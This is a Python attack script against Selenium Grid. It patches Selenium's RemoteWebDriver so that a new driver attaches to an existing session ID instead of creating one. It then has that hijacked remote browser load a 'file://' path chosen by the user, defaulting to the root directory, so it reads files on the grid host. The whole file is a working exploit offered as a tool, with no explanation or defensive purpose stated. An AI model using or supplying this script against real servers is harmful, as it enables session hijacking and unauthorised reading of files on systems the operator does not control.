import argparse
from selenium import webdriver


def create_driver_session(session_id, executor_url):
    from selenium.webdriver.remote.webdriver import WebDriver as RemoteWebDriver

    # Save the original function, so we can revert our patch
    org_command_execute = RemoteWebDriver.execute


    def new_command_execute(self, command, params=None):
        if command == "newSession":
            # Mock the response
            return {'success': 0, 'value': None, 'sessionId': session_id}

    # Patch the function before creating the driver object
    RemoteWebDriver.execute = new_command_execute

    new_driver = webdriver.Remote(command_executor=executor_url, desired_capabilities={})
    new_driver.session_id = session_id

    # Replace the patched function with original function
    RemoteWebDriver.execute = org_command_execute

    return new_driver

if __name__ == "__main__":
    Parser = argparse.ArgumentParser()
    Parser.add_argument('-u', '--url', help='Target URL')
    Parser.add_argument('-s', '--sessionid', help='Session ID from Selenium Hub session.')
    Parser.add_argument('-f', '--file', help='File to read')
    args = Parser.parse_args()

    if args.url is None:
        print('Specify a URL')
        Parser.print_help()
        exit(1)

    if args.sessionid is None:
        print('Specify a Session ID')
        Parser.print_help()
        exit (1)

    if args.file is None:
        args.file = '/'

    grid_url = args.url
    sessionid = args.sessionid
    payload = args.file

    driver_chrome_reuse = create_driver_session(sessionid, grid_url)
    driver_chrome_reuse.get('file://' + payload)
